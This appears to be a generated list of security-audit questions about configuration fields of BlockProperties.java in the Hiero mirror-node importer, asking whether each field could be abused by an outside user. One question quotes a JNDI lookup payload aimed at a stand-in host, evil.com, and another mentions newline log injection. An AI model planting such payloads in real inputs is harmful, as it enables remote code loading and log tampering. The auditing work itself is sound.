question: [File: 'File Name: importer/src/main/java/org/hiero/mirror/importer/downloader/block/BlockProperties.java -> Scope: '] [Field: nodes] Can an unprivileged external user inject a `BlockNodeProperties` with `host` set to a hostname that resolves to a broadcast or multicast address, causing the importer to send block stream requests to unintended network destinations?

[File: 'File Name: importer/src/main/java/org/hiero/mirror/importer/downloader/block/BlockProperties.java -> Scope: '] [Field: stream] Can an unprivileged external user set `stream.maxStreamResponseSize` to `DataSize.ofBytes(1)`, causing every block stream response to exceed the size limit and be rejected, effectively halting all block ingestion?

[File: 'File Name: importer/src/main/java/org/hiero/mirror/importer/downloader/block/BlockProperties.java -> Scope: '] [Field: nodes] Can an unprivileged external user supply a `nodes` collection containing only entries with `requiresTls=false`, causing the importer to downgrade all block node connections from TLS to plaintext and expose the block stream to man-in-the-middle attacks?

[File: 'File Name: importer/src/main/java/org/hiero/mirror/importer/downloader/block/BlockProperties.java -> Scope: '] [Field: autoDiscoveryEnabled] Can an unprivileged external user enable `autoDiscoveryEnabled` and then poison the `RegisteredNodeRepository` data (via a separate vulnerability) to inject malicious block node endpoints that get auto-discovered and used by the importer?

[File: 'File Name: importer/src/main/java/org/hiero/mirror/importer/downloader/block/BlockProperties.java -> Scope: '] [Field: frequency] Can an unprivileged external user set `frequency` to `Duration.ZERO` (zero duration, which passes `@NotNull` but has no minimum constraint), causing the scheduler to spin in a tight loop and consume 100% CPU?

[File: 'File Name: importer/src/main/java/org/hiero/mirror/importer/downloader/block/BlockProperties.java -> Scope: '] [Field: nodes] Can an unprivileged external user inject a `BlockNodeProperties` with `host` set to an IPv6 address without brackets (e.g., `::1`), causing `getEndpoint()` to produce `::1:40840` which is an invalid endpoint string and may cause the gRPC channel builder to fail or misparse the address?

[File: 'File Name: importer/src/main/java/org/hiero/mirror/importer/downloader/block/BlockProperties.java -> Scope: '] [Field: nodes] Can an unprivileged external user inject a `BlockNodeProperties` with an extremely long `host` string (no `@Size(max=...)` constraint on `host`), causing excessive memory allocation or log injection when the host is logged by `BlockNodeDiscoveryService`?

[File: 'File Name: importer/src/main/java/org/hiero/mirror/importer/downloader/block/BlockProperties.java -> Scope: '] [Field: nodes] Can an unprivileged external user inject a `BlockNodeProperties` with `host` containing newline characters (`\n`, `\r`), causing log injection attacks when the endpoint is logged by the importer?

[File: 'File Name: importer/src/main/java/org/hiero/mirror/importer/downloader/block/BlockProperties.java -> Scope: '] [Field: nodes] Can an unprivileged external user inject a `BlockNodeProperties` with `host` containing JNDI lookup strings (e.g., `${jndi:ldap://evil.com/x}`), exploiting any logging framework that processes the host value without sanitization?

[File: 'File Name: importer/src/main/java/org/hiero/mirror/importer/downloader/block/BlockProperties.java -> Scope: '] [Field: sourceType] Can an unprivileged external user set `sourceType` to a value that causes `CompositeBlockSource` to select a file-based source, and then manipulate the file path configuration to read block data from an attacker-controlled location?

[File: 'File Name: importer/src/main/java/org/hiero/mirror/importer/downloader/block/BlockProperties.java -> Scope: '] [Field: ledger] Can an unprivileged external user supply a `LedgerProperties` with `historyProofVerificationKey` set to an all-zeros byte array (passes `@NotEmpty` since length > 0), causing the TSS verifier to use a trivially weak key and accept any block signature?

[File: 'File Name: importer/src/main/java/org/hiero/mirror/importer/downloader/block/BlockProperties.java -> Scope: '] [Field: ledger] Can an unprivileged external user supply a `LedgerProperties` with `ledgerId` set to an all-zeros byte array (passes `@NotEmpty`), causing the importer to accept blocks from any ledger that also uses an all-zeros ID, breaking ledger isolation?

[File: 'File Name: importer/src/main/java/org/hiero/mirror/importer/downloader/block/BlockProperties.java -> Scope: '] [Field: stream] Can an unprivileged external user set `stream.responseTimeout` to `Duration.ofDays(1)` (no maximum constraint), causing the importer to hold open gRPC connections for 24 hours waiting for responses, exhausting connection pool resources?
